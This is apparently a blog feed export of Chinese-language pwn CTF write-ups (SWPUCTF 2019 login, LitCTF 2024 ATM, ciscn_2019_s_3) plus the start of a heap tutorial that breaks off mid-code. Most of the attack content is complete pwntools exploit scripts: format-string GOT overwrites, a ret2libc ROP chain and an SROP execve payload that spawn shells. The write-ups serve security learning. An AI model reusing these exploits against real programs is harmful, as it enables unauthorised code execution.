        <content type="html"><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>在printf函数后面，若是存在%s %x %n$x类似的函数</p></blockquote><p>就会读取栈上内存上的内容进行转化</p><blockquote><p>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别</p><p>利用 %s 来获取变量所对应地址的内容，只不过有零截断</p><p>利用 %n$x 来获取指定参数的值，利用 %n$s 来获取指定参数对应地址的内容</p></blockquote><p><strong>原理</strong>:在做题时会进行对多个’[标记]%p’类似的是为了确定在栈上读取到相应位置的值</p><h1 id="非栈上的格式化字符串"><a href="#非栈上的格式化字符串" class="headerlink" title="非栈上的格式化字符串"></a>非栈上的格式化字符串</h1><blockquote><p>当我们的输入函数是把输入的放在bss段或者堆上面，就无法直接通过覆盖ebp进行溢出改变值了，这个时候我们就有其他的做题方法了</p></blockquote><p>现在通过一道题目来解释这个方法</p><h2 id="SWPUCTF-2019-login"><a href="#SWPUCTF-2019-login" class="headerlink" title="SWPUCTF_2019_login"></a>SWPUCTF_2019_login</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111942075.png" alt="1"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111943249.png" alt="2"></p><p>像这样的这样 无法通过直接写道栈上</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111942592.png" alt="4"></p><p>来到printf函数这里进行动态调试</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111942805.png" alt="3"></p><blockquote><p>因为格式化字符串改值需要利用上图中第一个红框和第二个红框这样的类似的链式结构来改写栈上面的地址</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#泄漏libc</span><br><span class="line">pay = b&#x27;%15$p&#x27;</span><br><span class="line">io.sendlineafter(&quot;Please input your password: &quot;,pay)</span><br><span class="line">io.recvuntil(&quot;This is the wrong password: 0x&quot;)</span><br><span class="line">libc_start_call_main = int(io.recv(8),16)-121</span><br><span class="line">print(&quot;libc_start_call_main--&gt;&quot;,hex(libc_start_call_main))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_call_main)</span><br><span class="line">libc_base = libc_start_call_main - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">print(&quot;libc_base--&gt;&quot;,hex(libc_base))</span><br><span class="line">sys_adr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#泄露栈地址</span><br><span class="line">pay = b&#x27;%6$p&#x27;</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line">io.recvuntil(&quot;This is the wrong password: &quot;)</span><br><span class="line">stack_adr = int(io.recvuntil(b&#x27;\n&#x27;)[:-1],16)-0x28</span><br></pre></td></tr></table></figure><p>接着就是本篇的重点了</p><p>先准备一下地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf_got_low4 = printf_got &amp; 0xffff</span><br><span class="line">printf_got_hig4 = (printf_got&gt;&gt;16)&amp;0xffff</span><br><span class="line">aim1 = (stack_adr&amp;0xffff)+0x14   #5</span><br><span class="line">aim2 = (stack_adr&amp;0xffff)+0x24    #9</span><br></pre></td></tr></table></figure><p>利用printf函数改写在栈上的地址实现</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111943315.png" alt="5"></p><p>首先看到这里ebp-&gt;0xffae58b4-&gt;0xffae58c8-&gt;0xffae58d8</p><p>（可能是只能改链状的第三个所以这么设计吧）</p><p>我们先改变0xffae58d8为0xffae58c4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = b&#x27;%&#x27;+str(aim1).encode(&quot;utf-8&quot;)+b&#x27;c%6$hn&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111943525.png" alt="7"></p><p>地址有点不同，看位置就好了</p><p>这里下面那个红框的会变成<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111943426.png" alt="8"></p><p>这样+10位置这里的也可以改变地址了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = b&#x27;%&#x27;+str(printf_got_low4).encode(&quot;utf-8&quot;)+b&#x27;c%10$hn&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111943820.png" alt="6"></p><p>这样 上面的printf_got就写入了函数中了</p><p>同理</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111943051.png" alt="9"></p><p>这个就改好了</p><p>接下来，我们改写printf_got的内容改为system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pay = b&#x27;%&#x27;+str(sys_low4).encode(&quot;utf-8&quot;)+b&#x27;c%5$hn&#x27;</span><br><span class="line">pay += b&#x27;%&#x27;+str(sys_hig4-sys_low4).encode(&quot;utf-8&quot;)+b&#x27;c%9$hn&#x27;</span><br></pre></td></tr></table></figure><p>改的都是第三个位置</p><p>最后总的exp</p><p>ps:本地的我自己怎么都打不通，求大神指导(博客有我邮件直接发就行)</p><p>远程用这个脚本可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from time import sleep</span><br><span class="line">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;)</span><br><span class="line">pwnfile = &#x27;./pwn&#x27;</span><br><span class="line">#io=process(pwnfile)</span><br><span class="line">io=remote(&#x27;node5.buuoj.cn&#x27;,28554)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">def debug():</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendlineafter(&quot;Please input your name: &quot;,b&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#泄漏libc</span><br><span class="line">pay = b&#x27;%15$p&#x27;</span><br><span class="line">io.sendlineafter(&quot;Please input your password: &quot;,pay)</span><br><span class="line">io.recvuntil(&quot;This is the wrong password: 0x&quot;)</span><br><span class="line">libc_start_call_main = int(io.recv(8),16)-241</span><br><span class="line">print(&quot;libc_start_call_main--&gt;&quot;,hex(libc_start_call_main))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_call_main)</span><br><span class="line">libc_base = libc_start_call_main - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">print(&quot;libc_base--&gt;&quot;,hex(libc_base))</span><br><span class="line">sys_adr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">sleep(0.5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#泄露栈地址</span><br><span class="line">pay = b&#x27;%6$p&#x27;</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line">io.recvuntil(&quot;This is the wrong password: &quot;)</span><br><span class="line">stack_adr = int(io.recvuntil(b&#x27;\n&#x27;)[:-1],16)-0x28</span><br><span class="line">print(&quot;stack_adr--&gt;&quot;,hex(stack_adr))</span><br><span class="line"></span><br><span class="line">#栈地址进行切片</span><br><span class="line">printf_got_low4 = printf_got &amp; 0xffff</span><br><span class="line">printf_got_hig4 = (printf_got&gt;&gt;16)&amp;0xffff</span><br><span class="line">#目标修改位置的地址</span><br><span class="line">aim1 = (stack_adr&amp;0xffff)+0x14   #5</span><br><span class="line"></span><br><span class="line">aim2 = (stack_adr&amp;0xffff)+0x24    #9</span><br><span class="line"></span><br><span class="line">print(&quot;printf_got--&gt;&quot;,hex(printf_got))</span><br><span class="line">print(&quot;printf_got_low4--&gt;&quot;,hex(printf_got_low4))</span><br><span class="line">print(&quot;printf_got_hig4--&gt;&quot;,hex(printf_got_hig4))</span><br><span class="line">print(&quot;aim1--&gt;&quot;,hex(aim1))</span><br><span class="line">print(&quot;aim2--&gt;&quot;,hex(aim2))</span><br><span class="line">#栈上写入printf_got及+2</span><br><span class="line">pay = b&#x27;%&#x27;+str(aim1).encode(&quot;utf-8&quot;)+b&#x27;c%6$hn&#x27;</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line">pay = b&#x27;%&#x27;+str(printf_got_low4).encode(&quot;utf-8&quot;)+b&#x27;c%10$hn&#x27;</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line">sleep(0.5)</span><br><span class="line">pay = b&#x27;%&#x27;+str(aim2).encode(&quot;utf-8&quot;)+b&#x27;c%6$hn&#x27;</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line">pay = b&#x27;%&#x27;+str(printf_got_low4+2).encode(&quot;utf-8&quot;)+b&#x27;c%10$hn&#x27;</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line">#debug()</span><br><span class="line">sleep(0.5)</span><br><span class="line">#一次性修改print_got</span><br><span class="line">sys_low4 = sys_adr &amp; 0xffff</span><br><span class="line">sys_hig4 = (sys_adr&gt;&gt;16) &amp; 0xffff</span><br><span class="line">print(&quot;sys_adr--&gt;&quot;,hex(sys_adr))</span><br><span class="line">print(&quot;sys_low4--&gt;&quot;,hex(sys_low4))</span><br><span class="line">print(&quot;sys_hig4--&gt;&quot;,hex(sys_hig4))</span><br><span class="line"></span><br><span class="line">pay = b&#x27;%&#x27;+str(sys_low4).encode(&quot;utf-8&quot;)+b&#x27;c%5$hn&#x27;</span><br><span class="line">pay += b&#x27;%&#x27;+str(sys_hig4-sys_low4).encode(&quot;utf-8&quot;)+b&#x27;c%9$hn&#x27;</span><br><span class="line">print(&quot;pay--&gt;&quot;,hex(len(pay)))</span><br><span class="line">io.sendlineafter(&quot;Try again!\n&quot;,pay)</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&quot;Try again!&quot;,b&#x27;cat flag&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF 2024 pwn ATM</title>
      <link href="/posts/7941.html"/>
      <url>/posts/7941.html</url>
      
        <content type="html"><![CDATA[<p>先查看文件</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958659.png" alt="3"></p><p>托入ida进行查看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958660.png" alt="4"></p><p>没有什么东西</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958661.png" alt="5"></p><p>​                                                     </p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958662.png" alt="6"></p><p>​                                              </p><p>可以看到首先有个死循环，就是不断的循环，让你选择不同函数作用</p><p>在图6可以读取到read这里有个明显的漏洞</p><p>接着我们要调节nbytes上面的参数</p><p>在图5上面的是把nptr的地址化为（unsigned int）接着下面的函数（第二个框）就把nbytes改变了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958663.png" alt="7"></p><p>可以跑程序看一下</p><p>在3函数随便改变输入就可以造成nptr值的改变</p><p>接下来找一下偏移</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958664.png" alt="2"></p><p>可以看到偏移是0x160</p><p>接下来就可以编写脚本了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111958665.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./app&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401233</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">b&#x27;asdd&#x27;</span>)<span class="comment">#无影响，随便出</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;4.Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;deposit:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#随便输入的数据</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;4.Exit&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr= <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p.sendline(b&#x27;a&#x27;*8)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x160</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;4.Exit&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP及例题</title>
      <link href="/posts/22962.html"/>
      <url>/posts/22962.html</url>
      
        <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><blockquote><p>有时候函数没有输出函数，无法使用ret2libc(或者直接没有got表)</p></blockquote><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0fh</span><br><span class="line"></span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>这样的指令（系统调用号15）sigreturn</p><p>2.还有较长的读取空间</p><p>3.有syscall_ret</p><p>4.有&#x2F;bin&#x2F;sh(若没有则需要自己写入)</p><blockquote><p>可以通过栈溢出来控制栈的内容<br>需要知道相应的地址<br>“&#x2F;bin&#x2F;sh”<br>Signal Frame<br>syscall<br>sigreturn<br>需要有够大的空间来塞下整个 sigal frame</p></blockquote><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><blockquote><p>ctf-wiki上面有</p></blockquote><ol><li><strong>总结一下就是调用了sigreturn后面程序会进入一个挂起的状态</strong></li><li>然后将此时的状态压入栈中</li><li>然后在<strong>sigreturn</strong>中填写指令</li><li>最后程序会返回原来的状态</li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>现在以一道例题来说明这个知识点</p><blockquote><p><strong>buu上面的ciscn_2019_s_3</strong></p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001024.png" alt="0"></p><p>先检查函数，64位，没有canary</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001025.png" alt="1"></p><p>再打开ida查看函数</p><p>发现有个gadgets</p><p>点<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001026.png" alt="2">进去看看</p><p><strong>发现可以系统调用号15 可以使用SROP取得这一个题目的权限</strong></p><p>先看函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001027.png" alt="3"></p><p>会打印出一串东西</p><p>动态调试看看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001028.png" alt="4"></p><p>看到在‘aaaaaaaa’后面打印出来了其他的</p><p>先写个脚本找找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001029.png" alt="5"></p><p>找到这个libc的地址，因此我们可以得到我们写入数据在栈上面的位置，因为这个题目里面没有&#x2F;bin&#x2F;sh\x00，所以我们可以在开始时写入</p><p>又3b08h-3c90h&#x3D;148h</p><p>所以可以知道</p><p>leak_addr-0x148是我们输入的位置</p><p><strong>这下可以求出&#x2F;bin&#x2F;sh的地址了</strong></p><p>现在我们在要在ida中找syscall</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001030.png" alt="6"></p><p>找到了</p><p>因此我们可以开始构造攻击了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;ciscn_s_3&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25661)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x4003a9</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4005a3</span></span><br><span class="line">cus1=<span class="number">0x400580</span></span><br><span class="line">cus2=<span class="number">0x400596</span></span><br><span class="line">execv=<span class="number">0x4004E2</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line">sigreturn=<span class="number">0x4004DA</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x4004ed</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">start=leak_addr-<span class="number">0x148</span>//远端的偏移是<span class="number">0X118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = start</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp=leak_addr</span><br><span class="line">sigframe.rip = sys</span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span></span><br><span class="line">payload2+=p64(sigreturn)+p64(sys)+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注：SROP的构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve//rax=<span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = start               //rbx=<span class="built_in">bin</span>/sh</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span>                 //rsi=<span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span>                 //rdi=<span class="number">0</span></span><br><span class="line">sigframe.rsp=leak_addr</span><br><span class="line">sigframe.rip = sys                  //执行execv /<span class="built_in">bin</span>/sh <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这段是pwntools自己集成的攻击手法，可以改变寄存器的值</p><p>最后拿到权限</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001031.png" alt="7"></p>]]></content>
      
      
      <categories>
          
          <category> pwn-栈学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> srop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆概述及其例题</title>
      <link href="/posts/8378.html"/>
      <url>/posts/8378.html</url>
      
        <content type="html"><![CDATA[<h1 id="堆概念"><a href="#堆概念" class="headerlink" title="堆概念"></a>堆概念</h1><blockquote><p> 在stdlib的头文件中存在malloc函数和free函数</p></blockquote><h2 id="两个系统调用"><a href="#两个系统调用" class="headerlink" title="两个系统调用"></a>两个系统调用</h2><h3 id="brk"><a href="#brk" class="headerlink" title="brk()"></a>brk()</h3><blockquote><p>brk()是通过增加break location 来获取内存的，开始heap区域的起点start_brk和终点brk是指向同一个位置的，</p><blockquote><p>ASLR关闭时，这两者都会指向data&#x2F;bss 段的末端，就是下面的end_data</p><p>ASLR开启时，这两者会在data&#x2F;bss段的末端加上一段随机的的brk偏移</p></blockquote></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111942228.jpg" alt=" "></p><p><strong>溢出方式</strong>：堆是向上面溢出的</p><p><strong>怎么一出到下面的空间</strong>：在32位的程序中通过整数溢出，超过这段空间时会从下面进行溢出</p><p><strong>怎么增大空间的</strong>：第一次申请空间的时候就是把brk结束的标识符往上面进行移动</p><p>当brk方式增大的空间超过了一定的地方就变成了mmap()溢出了</p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h3><p>用于创建私有的匿名映射段，主要是为了分配一块新的内存，并且这块内存只用调用mmap(）的进程才可以使用，所以时私有的。与之相反的操作时munmap(),删除一段内存区域上面的映射</p><blockquote><p>malloc 会使用 mmap()来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用</p></blockquote><h2 id="多线程和Arena"><a href="#多线程和Arena" class="headerlink" title="多线程和Arena"></a>多线程和Arena</h2><blockquote><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆</p></blockquote><blockquote><p>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存区域为 arena。</p><p>此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 